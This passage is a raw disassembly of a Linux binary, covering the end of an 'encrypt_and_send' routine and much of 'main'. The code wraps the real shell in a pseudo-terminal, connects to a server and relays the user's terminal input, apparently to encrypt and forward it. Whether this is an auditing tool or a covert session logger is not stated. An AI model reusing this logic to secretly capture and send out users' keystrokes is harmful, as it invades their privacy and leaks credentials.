  4020d0:	48 89 c7             	mov    %rax,%rdi
  4020d3:	e8 b2 0a 00 00       	callq  402b8a <__print_output>
  4020d8:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  4020df:	8b 40 14             	mov    0x14(%rax),%eax
  4020e2:	8d 50 01             	lea    0x1(%rax),%edx
  4020e5:	48 8b 85 38 da ff ff 	mov    -0x25c8(%rbp),%rax
  4020ec:	89 50 14             	mov    %edx,0x14(%rax)
  4020ef:	81 85 40 da ff ff 00 	addl   $0x200,-0x25c0(%rbp)
  4020f6:	02 00 00 
  4020f9:	48 8b 85 30 da ff ff 	mov    -0x25d0(%rbp),%rax
  402100:	8b 40 60             	mov    0x60(%rax),%eax
  402103:	3b 85 40 da ff ff    	cmp    -0x25c0(%rbp),%eax
  402109:	0f 8f d9 f4 ff ff    	jg     4015e8 <encrypt_and_send+0x4c>
  40210f:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
  402113:	64 48 33 1c 25 28 00 	xor    %fs:0x28,%rbx
  40211a:	00 00 
  40211c:	74 05                	je     402123 <encrypt_and_send+0xb87>
  40211e:	e8 0d ed ff ff       	callq  400e30 <__stack_chk_fail@plt>
  402123:	48 81 c4 c8 25 00 00 	add    $0x25c8,%rsp
  40212a:	5b                   	pop    %rbx
  40212b:	5d                   	pop    %rbp
  40212c:	c3                   	retq   

000000000040212d <main>:
  40212d:	55                   	push   %rbp
  40212e:	48 89 e5             	mov    %rsp,%rbp
  402131:	48 81 ec 60 12 00 00 	sub    $0x1260,%rsp
  402138:	89 bd ac ed ff ff    	mov    %edi,-0x1254(%rbp)
  40213e:	48 89 b5 a0 ed ff ff 	mov    %rsi,-0x1260(%rbp)
  402145:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  40214c:	00 00 
  40214e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  402152:	31 c0                	xor    %eax,%eax
  402154:	c7 85 c4 ed ff ff 00 	movl   $0x0,-0x123c(%rbp)
  40215b:	00 00 00 
  40215e:	c7 85 c8 ed ff ff 00 	movl   $0x0,-0x1238(%rbp)
  402165:	00 00 00 
  402168:	c7 85 c0 ed ff ff ff 	movl   $0xffffffff,-0x1240(%rbp)
  40216f:	ff ff ff 
  402172:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402178:	89 85 bc ed ff ff    	mov    %eax,-0x1244(%rbp)
  40217e:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402184:	89 85 70 ee ff ff    	mov    %eax,-0x1190(%rbp)
  40218a:	48 8d 95 90 ee ff ff 	lea    -0x1170(%rbp),%rdx
  402191:	48 8b b5 a0 ed ff ff 	mov    -0x1260(%rbp),%rsi
  402198:	8b 85 ac ed ff ff    	mov    -0x1254(%rbp),%eax
  40219e:	b9 00 01 00 00       	mov    $0x100,%ecx
  4021a3:	89 c7                	mov    %eax,%edi
  4021a5:	e8 3e f2 ff ff       	callq  4013e8 <create_real_shell_run_cmd>
  4021aa:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  4021b0:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  4021b7:	74 50                	je     402209 <main+0xdc>
  4021b9:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4021c0:	48 89 c7             	mov    %rax,%rdi
  4021c3:	e8 bd 0a 00 00       	callq  402c85 <pretty_time>
  4021c8:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4021cf:	48 89 c2             	mov    %rax,%rdx
  4021d2:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4021d7:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4021dc:	b8 00 00 00 00       	mov    $0x0,%eax
  4021e1:	e8 8a ec ff ff       	callq  400e70 <printf@plt>
  4021e6:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4021eb:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4021f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4021f5:	e8 76 ec ff ff       	callq  400e70 <printf@plt>
  4021fa:	bf 38 7a 40 00       	mov    $0x407a38,%edi
  4021ff:	e8 ec eb ff ff       	callq  400df0 <puts@plt>
  402204:	e9 19 09 00 00       	jmpq   402b22 <main+0x9f5>
  402209:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402210:	48 89 c7             	mov    %rax,%rdi
  402213:	e8 6d 0a 00 00       	callq  402c85 <pretty_time>
  402218:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40221f:	48 89 c2             	mov    %rax,%rdx
  402222:	be 59 7a 40 00       	mov    $0x407a59,%esi
  402227:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40222c:	b8 00 00 00 00       	mov    $0x0,%eax
  402231:	e8 3a ec ff ff       	callq  400e70 <printf@plt>
  402236:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40223b:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402240:	b8 00 00 00 00       	mov    $0x0,%eax
  402245:	e8 26 ec ff ff       	callq  400e70 <printf@plt>
  40224a:	48 8d 85 90 ee ff ff 	lea    -0x1170(%rbp),%rax
  402251:	48 89 c6             	mov    %rax,%rsi
  402254:	bf 5d 7a 40 00       	mov    $0x407a5d,%edi
  402259:	b8 00 00 00 00       	mov    $0x0,%eax
  40225e:	e8 0d ec ff ff       	callq  400e70 <printf@plt>
  402263:	bf 00 00 00 00       	mov    $0x0,%edi
  402268:	e8 93 eb ff ff       	callq  400e00 <isatty@plt>
  40226d:	85 c0                	test   %eax,%eax
  40226f:	74 26                	je     402297 <main+0x16a>
  402271:	bf 01 00 00 00       	mov    $0x1,%edi
  402276:	e8 85 eb ff ff       	callq  400e00 <isatty@plt>
  40227b:	85 c0                	test   %eax,%eax
  40227d:	74 18                	je     402297 <main+0x16a>
  40227f:	bf 02 00 00 00       	mov    $0x2,%edi
  402284:	e8 77 eb ff ff       	callq  400e00 <isatty@plt>
  402289:	85 c0                	test   %eax,%eax
  40228b:	74 0a                	je     402297 <main+0x16a>
  40228d:	e8 3e ed ff ff       	callq  400fd0 <getlogin@plt>
  402292:	48 85 c0             	test   %rax,%rax
  402295:	75 50                	jne    4022e7 <main+0x1ba>
  402297:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40229e:	48 89 c7             	mov    %rax,%rdi
  4022a1:	e8 df 09 00 00       	callq  402c85 <pretty_time>
  4022a6:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4022ad:	48 89 c2             	mov    %rax,%rdx
  4022b0:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4022b5:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4022ba:	b8 00 00 00 00       	mov    $0x0,%eax
  4022bf:	e8 ac eb ff ff       	callq  400e70 <printf@plt>
  4022c4:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4022c9:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4022ce:	b8 00 00 00 00       	mov    $0x0,%eax
  4022d3:	e8 98 eb ff ff       	callq  400e70 <printf@plt>
  4022d8:	bf 70 7a 40 00       	mov    $0x407a70,%edi
  4022dd:	e8 0e eb ff ff       	callq  400df0 <puts@plt>
  4022e2:	e9 3b 08 00 00       	jmpq   402b22 <main+0x9f5>
  4022e7:	48 8d 85 70 ee ff ff 	lea    -0x1190(%rbp),%rax
  4022ee:	48 89 c7             	mov    %rax,%rdi
  4022f1:	e8 02 f0 ff ff       	callq  4012f8 <create_server_connection>
  4022f6:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  4022fc:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  402303:	74 50                	je     402355 <main+0x228>
  402305:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40230c:	48 89 c7             	mov    %rax,%rdi
  40230f:	e8 71 09 00 00       	callq  402c85 <pretty_time>
  402314:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40231b:	48 89 c2             	mov    %rax,%rdx
  40231e:	be c1 78 40 00       	mov    $0x4078c1,%esi
  402323:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  402328:	b8 00 00 00 00       	mov    $0x0,%eax
  40232d:	e8 3e eb ff ff       	callq  400e70 <printf@plt>
  402332:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  402337:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  40233c:	b8 00 00 00 00       	mov    $0x0,%eax
  402341:	e8 2a eb ff ff       	callq  400e70 <printf@plt>
  402346:	bf 98 7a 40 00       	mov    $0x407a98,%edi
  40234b:	e8 a0 ea ff ff       	callq  400df0 <puts@plt>
  402350:	e9 cd 07 00 00       	jmpq   402b22 <main+0x9f5>
  402355:	48 8d b5 c0 ed ff ff 	lea    -0x1240(%rbp),%rsi
  40235c:	48 8d 85 bc ed ff ff 	lea    -0x1244(%rbp),%rax
  402363:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  402369:	b9 00 00 00 00       	mov    $0x0,%ecx
  40236e:	ba 00 00 00 00       	mov    $0x0,%edx
  402373:	48 89 c7             	mov    %rax,%rdi
  402376:	e8 05 ec ff ff       	callq  400f80 <openpty@plt>
  40237b:	85 c0                	test   %eax,%eax
  40237d:	79 5e                	jns    4023dd <main+0x2b0>
  40237f:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402386:	48 89 c7             	mov    %rax,%rdi
  402389:	e8 f7 08 00 00       	callq  402c85 <pretty_time>
  40238e:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402395:	48 89 c2             	mov    %rax,%rdx
  402398:	be c1 78 40 00       	mov    $0x4078c1,%esi
  40239d:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4023a2:	b8 00 00 00 00       	mov    $0x0,%eax
  4023a7:	e8 c4 ea ff ff       	callq  400e70 <printf@plt>
  4023ac:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4023b1:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4023b6:	b8 00 00 00 00       	mov    $0x0,%eax
  4023bb:	e8 b0 ea ff ff       	callq  400e70 <printf@plt>
  4023c0:	e8 1b ea ff ff       	callq  400de0 <__errno_location@plt>
  4023c5:	8b 00                	mov    (%rax),%eax
  4023c7:	89 c6                	mov    %eax,%esi
  4023c9:	bf b8 7a 40 00       	mov    $0x407ab8,%edi
  4023ce:	b8 00 00 00 00       	mov    $0x0,%eax
  4023d3:	e8 98 ea ff ff       	callq  400e70 <printf@plt>
  4023d8:	e9 45 07 00 00       	jmpq   402b22 <main+0x9f5>
  4023dd:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4023e3:	89 c7                	mov    %eax,%edi
  4023e5:	e8 f6 eb ff ff       	callq  400fe0 <ttyname@plt>
  4023ea:	48 89 85 d8 ed ff ff 	mov    %rax,-0x1228(%rbp)
  4023f1:	48 83 bd d8 ed ff ff 	cmpq   $0x0,-0x1228(%rbp)
  4023f8:	00 
  4023f9:	75 5e                	jne    402459 <main+0x32c>
  4023fb:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402402:	48 89 c7             	mov    %rax,%rdi
  402405:	e8 7b 08 00 00       	callq  402c85 <pretty_time>
  40240a:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402411:	48 89 c2             	mov    %rax,%rdx
  402414:	be c1 78 40 00       	mov    $0x4078c1,%esi
  402419:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40241e:	b8 00 00 00 00       	mov    $0x0,%eax
  402423:	e8 48 ea ff ff       	callq  400e70 <printf@plt>
  402428:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40242d:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402432:	b8 00 00 00 00       	mov    $0x0,%eax
  402437:	e8 34 ea ff ff       	callq  400e70 <printf@plt>
  40243c:	e8 9f e9 ff ff       	callq  400de0 <__errno_location@plt>
  402441:	8b 00                	mov    (%rax),%eax
  402443:	89 c6                	mov    %eax,%esi
  402445:	bf d9 7a 40 00       	mov    $0x407ad9,%edi
  40244a:	b8 00 00 00 00       	mov    $0x0,%eax
  40244f:	e8 1c ea ff ff       	callq  400e70 <printf@plt>
  402454:	e9 c9 06 00 00       	jmpq   402b22 <main+0x9f5>
  402459:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402460:	48 89 c7             	mov    %rax,%rdi
  402463:	e8 1d 08 00 00       	callq  402c85 <pretty_time>
  402468:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40246f:	48 89 c2             	mov    %rax,%rdx
  402472:	be 59 7a 40 00       	mov    $0x407a59,%esi
  402477:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40247c:	b8 00 00 00 00       	mov    $0x0,%eax
  402481:	e8 ea e9 ff ff       	callq  400e70 <printf@plt>
  402486:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40248b:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402490:	b8 00 00 00 00       	mov    $0x0,%eax
  402495:	e8 d6 e9 ff ff       	callq  400e70 <printf@plt>
  40249a:	48 8b 85 d8 ed ff ff 	mov    -0x1228(%rbp),%rax
  4024a1:	48 89 c6             	mov    %rax,%rsi
  4024a4:	bf f2 7a 40 00       	mov    $0x407af2,%edi
  4024a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4024ae:	e8 bd e9 ff ff       	callq  400e70 <printf@plt>
  4024b3:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4024b9:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  4024c0:	48 89 d6             	mov    %rdx,%rsi
  4024c3:	89 c7                	mov    %eax,%edi
  4024c5:	e8 cf ec ff ff       	callq  401199 <setup_terminal>
  4024ca:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  4024d0:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  4024d7:	74 50                	je     402529 <main+0x3fc>
  4024d9:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4024e0:	48 89 c7             	mov    %rax,%rdi
  4024e3:	e8 9d 07 00 00       	callq  402c85 <pretty_time>
  4024e8:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4024ef:	48 89 c2             	mov    %rax,%rdx
  4024f2:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4024f7:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4024fc:	b8 00 00 00 00       	mov    $0x0,%eax
  402501:	e8 6a e9 ff ff       	callq  400e70 <printf@plt>
  402506:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40250b:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402510:	b8 00 00 00 00       	mov    $0x0,%eax
  402515:	e8 56 e9 ff ff       	callq  400e70 <printf@plt>
  40251a:	bf 03 7b 40 00       	mov    $0x407b03,%edi
  40251f:	e8 cc e8 ff ff       	callq  400df0 <puts@plt>
  402524:	e9 f9 05 00 00       	jmpq   402b22 <main+0x9f5>
  402529:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  402530:	48 83 c0 10          	add    $0x10,%rax
  402534:	48 89 c2             	mov    %rax,%rdx
  402537:	be 13 54 00 00       	mov    $0x5413,%esi
  40253c:	bf 00 00 00 00       	mov    $0x0,%edi
  402541:	b8 00 00 00 00       	mov    $0x0,%eax
  402546:	e8 75 e9 ff ff       	callq  400ec0 <ioctl@plt>
  40254b:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402551:	48 8d 95 90 ef ff ff 	lea    -0x1070(%rbp),%rdx
  402558:	48 83 c2 10          	add    $0x10,%rdx
  40255c:	be 14 54 00 00       	mov    $0x5414,%esi
  402561:	89 c7                	mov    %eax,%edi
  402563:	b8 00 00 00 00       	mov    $0x0,%eax
  402568:	e8 53 e9 ff ff       	callq  400ec0 <ioctl@plt>
  40256d:	be 5d 11 40 00       	mov    $0x40115d,%esi
  402572:	bf 1c 00 00 00       	mov    $0x1c,%edi
  402577:	e8 c4 e9 ff ff       	callq  400f40 <signal@plt>
  40257c:	be 5d 11 40 00       	mov    $0x40115d,%esi
  402581:	bf 11 00 00 00       	mov    $0x11,%edi
  402586:	e8 b5 e9 ff ff       	callq  400f40 <signal@plt>
  40258b:	e8 a0 ea ff ff       	callq  401030 <fork@plt>
  402590:	89 85 e8 ef ff ff    	mov    %eax,-0x1018(%rbp)
  402596:	8b 85 e8 ef ff ff    	mov    -0x1018(%rbp),%eax
  40259c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40259f:	74 09                	je     4025aa <main+0x47d>
  4025a1:	85 c0                	test   %eax,%eax
  4025a3:	74 72                	je     402617 <main+0x4ea>
  4025a5:	e9 f1 01 00 00       	jmpq   40279b <main+0x66e>
  4025aa:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4025b1:	48 89 c7             	mov    %rax,%rdi
  4025b4:	e8 17 ed ff ff       	callq  4012d0 <reset_terminal>
  4025b9:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4025c0:	48 89 c7             	mov    %rax,%rdi
  4025c3:	e8 bd 06 00 00       	callq  402c85 <pretty_time>
  4025c8:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  4025cf:	48 89 c2             	mov    %rax,%rdx
  4025d2:	be c1 78 40 00       	mov    $0x4078c1,%esi
  4025d7:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  4025dc:	b8 00 00 00 00       	mov    $0x0,%eax
  4025e1:	e8 8a e8 ff ff       	callq  400e70 <printf@plt>
  4025e6:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  4025eb:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  4025f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4025f5:	e8 76 e8 ff ff       	callq  400e70 <printf@plt>
  4025fa:	e8 e1 e7 ff ff       	callq  400de0 <__errno_location@plt>
  4025ff:	8b 00                	mov    (%rax),%eax
  402601:	89 c6                	mov    %eax,%esi
  402603:	bf 19 7b 40 00       	mov    $0x407b19,%edi
  402608:	b8 00 00 00 00       	mov    $0x0,%eax
  40260d:	e8 5e e8 ff ff       	callq  400e70 <printf@plt>
  402612:	e9 0b 05 00 00       	jmpq   402b22 <main+0x9f5>
  402617:	e8 d4 e8 ff ff       	callq  400ef0 <setsid@plt>
  40261c:	89 85 c8 ed ff ff    	mov    %eax,-0x1238(%rbp)
  402622:	83 bd c8 ed ff ff 00 	cmpl   $0x0,-0x1238(%rbp)
  402629:	74 59                	je     402684 <main+0x557>
  40262b:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  402632:	48 89 c7             	mov    %rax,%rdi
  402635:	e8 4b 06 00 00       	callq  402c85 <pretty_time>
  40263a:	48 8d 85 60 ee ff ff 	lea    -0x11a0(%rbp),%rax
  402641:	48 89 c2             	mov    %rax,%rdx
  402644:	be c1 78 40 00       	mov    $0x4078c1,%esi
  402649:	bf c5 78 40 00       	mov    $0x4078c5,%edi
  40264e:	b8 00 00 00 00       	mov    $0x0,%eax
  402653:	e8 18 e8 ff ff       	callq  400e70 <printf@plt>
  402658:	be b1 7b 40 00       	mov    $0x407bb1,%esi
  40265d:	bf cf 78 40 00       	mov    $0x4078cf,%edi
  402662:	b8 00 00 00 00       	mov    $0x0,%eax
  402667:	e8 04 e8 ff ff       	callq  400e70 <printf@plt>
  40266c:	e8 6f e7 ff ff       	callq  400de0 <__errno_location@plt>
  402671:	8b 00                	mov    (%rax),%eax
  402673:	89 c6                	mov    %eax,%esi
  402675:	bf 30 7b 40 00       	mov    $0x407b30,%edi
  40267a:	b8 00 00 00 00       	mov    $0x0,%eax
  40267f:	e8 ec e7 ff ff       	callq  400e70 <printf@plt>
  402684:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  40268a:	ba 00 00 00 00       	mov    $0x0,%edx
  40268f:	be 0e 54 00 00       	mov    $0x540e,%esi
  402694:	89 c7                	mov    %eax,%edi
  402696:	b8 00 00 00 00       	mov    $0x0,%eax
  40269b:	e8 20 e8 ff ff       	callq  400ec0 <ioctl@plt>
  4026a0:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026a6:	85 c0                	test   %eax,%eax
  4026a8:	74 1c                	je     4026c6 <main+0x599>
  4026aa:	bf 00 00 00 00       	mov    $0x0,%edi
  4026af:	e8 2c e8 ff ff       	callq  400ee0 <close@plt>
  4026b4:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026ba:	be 00 00 00 00       	mov    $0x0,%esi
  4026bf:	89 c7                	mov    %eax,%edi
  4026c1:	e8 9a e7 ff ff       	callq  400e60 <dup2@plt>
  4026c6:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026cc:	83 f8 01             	cmp    $0x1,%eax
  4026cf:	74 1c                	je     4026ed <main+0x5c0>
  4026d1:	bf 01 00 00 00       	mov    $0x1,%edi
  4026d6:	e8 05 e8 ff ff       	callq  400ee0 <close@plt>
  4026db:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026e1:	be 01 00 00 00       	mov    $0x1,%esi
  4026e6:	89 c7                	mov    %eax,%edi
  4026e8:	e8 73 e7 ff ff       	callq  400e60 <dup2@plt>
  4026ed:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  4026f3:	83 f8 02             	cmp    $0x2,%eax
  4026f6:	74 1c                	je     402714 <main+0x5e7>
  4026f8:	bf 02 00 00 00       	mov    $0x2,%edi
  4026fd:	e8 de e7 ff ff       	callq  400ee0 <close@plt>
  402702:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402708:	be 02 00 00 00       	mov    $0x2,%esi
  40270d:	89 c7                	mov    %eax,%edi
  40270f:	e8 4c e7 ff ff       	callq  400e60 <dup2@plt>
  402714:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  40271a:	83 f8 02             	cmp    $0x2,%eax
  40271d:	7e 0d                	jle    40272c <main+0x5ff>
  40271f:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402725:	89 c7                	mov    %eax,%edi
  402727:	e8 b4 e7 ff ff       	callq  400ee0 <close@plt>
  40272c:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  402732:	83 f8 02             	cmp    $0x2,%eax
  402735:	7e 0d                	jle    402744 <main+0x617>
  402737:	8b 85 c0 ed ff ff    	mov    -0x1240(%rbp),%eax
  40273d:	89 c7                	mov    %eax,%edi
  40273f:	e8 9c e7 ff ff       	callq  400ee0 <close@plt>
  402744:	8b 85 70 ee ff ff    	mov    -0x1190(%rbp),%eax
  40274a:	89 c7                	mov    %eax,%edi
  40274c:	e8 8f e7 ff ff       	callq  400ee0 <close@plt>
  402751:	bf 50 c3 00 00       	mov    $0xc350,%edi
  402756:	e8 f5 e8 ff ff       	callq  401050 <usleep@plt>
  40275b:	48 8b 95 a0 ed ff ff 	mov    -0x1260(%rbp),%rdx
  402762:	48 8d 85 90 ee ff ff 	lea    -0x1170(%rbp),%rax
  402769:	48 89 d6             	mov    %rdx,%rsi
  40276c:	48 89 c7             	mov    %rax,%rdi
  40276f:	e8 ac e8 ff ff       	callq  401020 <execv@plt>
  402774:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  40277b:	48 83 c0 18          	add    $0x18,%rax
  40277f:	48 89 c2             	mov    %rax,%rdx
  402782:	be 00 00 00 00       	mov    $0x0,%esi
  402787:	bf 00 00 00 00       	mov    $0x0,%edi
  40278c:	e8 6f e8 ff ff       	callq  401000 <tcsetattr@plt>
  402791:	bf 01 00 00 00       	mov    $0x1,%edi
  402796:	e8 75 e8 ff ff       	callq  401010 <exit@plt>
  40279b:	bf 00 00 00 00       	mov    $0x0,%edi
  4027a0:	e8 eb e7 ff ff       	callq  400f90 <time@plt>
  4027a5:	89 c7                	mov    %eax,%edi
  4027a7:	e8 74 e7 ff ff       	callq  400f20 <srand@plt>
  4027ac:	e8 8f e6 ff ff       	callq  400e40 <getuid@plt>
  4027b1:	89 85 e4 ef ff ff    	mov    %eax,-0x101c(%rbp)
  4027b7:	b8 00 00 00 00       	mov    $0x0,%eax
  4027bc:	ba 10 00 00 00       	mov    $0x10,%edx
  4027c1:	48 8d b5 e0 ed ff ff 	lea    -0x1220(%rbp),%rsi
  4027c8:	48 89 d1             	mov    %rdx,%rcx
  4027cb:	48 89 f7             	mov    %rsi,%rdi
  4027ce:	fc                   	cld    
  4027cf:	f3 48 ab             	rep stos %rax,%es:(%rdi)
  4027d2:	89 f8                	mov    %edi,%eax
  4027d4:	89 ca                	mov    %ecx,%edx
  4027d6:	89 95 cc ed ff ff    	mov    %edx,-0x1234(%rbp)
  4027dc:	89 85 d0 ed ff ff    	mov    %eax,-0x1230(%rbp)
  4027e2:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  4027e8:	8d 50 3f             	lea    0x3f(%rax),%edx
  4027eb:	85 c0                	test   %eax,%eax
  4027ed:	0f 48 c2             	cmovs  %edx,%eax
  4027f0:	c1 f8 06             	sar    $0x6,%eax
  4027f3:	48 63 d0             	movslq %eax,%rdx
  4027f6:	48 8b b4 d5 e0 ed ff 	mov    -0x1220(%rbp,%rdx,8),%rsi
  4027fd:	ff 
  4027fe:	8b 95 bc ed ff ff    	mov    -0x1244(%rbp),%edx
  402804:	89 d1                	mov    %edx,%ecx
  402806:	c1 f9 1f             	sar    $0x1f,%ecx
  402809:	c1 e9 1a             	shr    $0x1a,%ecx
  40280c:	01 ca                	add    %ecx,%edx
  40280e:	83 e2 3f             	and    $0x3f,%edx
  402811:	29 ca                	sub    %ecx,%edx
  402813:	bf 01 00 00 00       	mov    $0x1,%edi
  402818:	89 d1                	mov    %edx,%ecx
  40281a:	48 d3 e7             	shl    %cl,%rdi
  40281d:	48 89 fa             	mov    %rdi,%rdx
  402820:	48 09 f2             	or     %rsi,%rdx
  402823:	48 98                	cltq   
  402825:	48 89 94 c5 e0 ed ff 	mov    %rdx,-0x1220(%rbp,%rax,8)
  40282c:	ff 
  40282d:	48 8b 85 e0 ed ff ff 	mov    -0x1220(%rbp),%rax
  402834:	48 83 c8 01          	or     $0x1,%rax
  402838:	48 89 85 e0 ed ff ff 	mov    %rax,-0x1220(%rbp)
  40283f:	8b 85 bc ed ff ff    	mov    -0x1244(%rbp),%eax
  402845:	ba 00 00 00 00       	mov    $0x0,%edx
  40284a:	85 c0                	test   %eax,%eax
  40284c:	0f 48 c2             	cmovs  %edx,%eax
  40284f:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402855:	8b 85 d4 ed ff ff    	mov    -0x122c(%rbp),%eax
  40285b:	8d 78 01             	lea    0x1(%rax),%edi
  40285e:	48 8d 85 e0 ed ff ff 	lea    -0x1220(%rbp),%rax
  402865:	41 b8 00 00 00 00    	mov    $0x0,%r8d
  40286b:	b9 00 00 00 00       	mov    $0x0,%ecx
  402870:	ba 00 00 00 00       	mov    $0x0,%edx
  402875:	48 89 c6             	mov    %rax,%rsi
  402878:	e8 23 e7 ff ff       	callq  400fa0 <select@plt>
  40287d:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402883:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  40288a:	79 2e                	jns    4028ba <main+0x78d>
  40288c:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402893:	79 20                	jns    4028b5 <main+0x788>
  402895:	e8 46 e5 ff ff       	callq  400de0 <__errno_location@plt>
  40289a:	8b 00                	mov    (%rax),%eax
  40289c:	83 f8 04             	cmp    $0x4,%eax
  40289f:	0f 84 f0 01 00 00    	je     402a95 <main+0x968>
  4028a5:	e8 36 e5 ff ff       	callq  400de0 <__errno_location@plt>
  4028aa:	8b 00                	mov    (%rax),%eax
  4028ac:	83 f8 0b             	cmp    $0xb,%eax
  4028af:	0f 84 e0 01 00 00    	je     402a95 <main+0x968>
  4028b5:	e9 67 02 00 00       	jmpq   402b21 <main+0x9f4>
  4028ba:	48 8b 85 e0 ed ff ff 	mov    -0x1220(%rbp),%rax
  4028c1:	83 e0 01             	and    $0x1,%eax
  4028c4:	48 85 c0             	test   %rax,%rax
  4028c7:	0f 84 c7 00 00 00    	je     402994 <main+0x867>
  4028cd:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4028d4:	be 00 00 00 00       	mov    $0x0,%esi
  4028d9:	48 89 c7             	mov    %rax,%rdi
  4028dc:	e8 cf e5 ff ff       	callq  400eb0 <gettimeofday@plt>
  4028e1:	48 8d 85 90 ef ff ff 	lea    -0x1070(%rbp),%rax
  4028e8:	48 83 c0 64          	add    $0x64,%rax
  4028ec:	ba 00 10 00 00       	mov    $0x1000,%edx
  4028f1:	48 89 c6             	mov    %rax,%rsi
  4028f4:	bf 00 00 00 00       	mov    $0x0,%edi
  4028f9:	e8 02 e6 ff ff       	callq  400f00 <read@plt>
  4028fe:	89 85 d4 ed ff ff    	mov    %eax,-0x122c(%rbp)
  402904:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  40290b:	7f 2e                	jg     40293b <main+0x80e>
  40290d:	83 bd d4 ed ff ff 00 	cmpl   $0x0,-0x122c(%rbp)
  402914:	79 20                	jns    402936 <main+0x809>
  402916:	e8 c5 e4 ff ff       	callq  400de0 <__errno_location@plt>
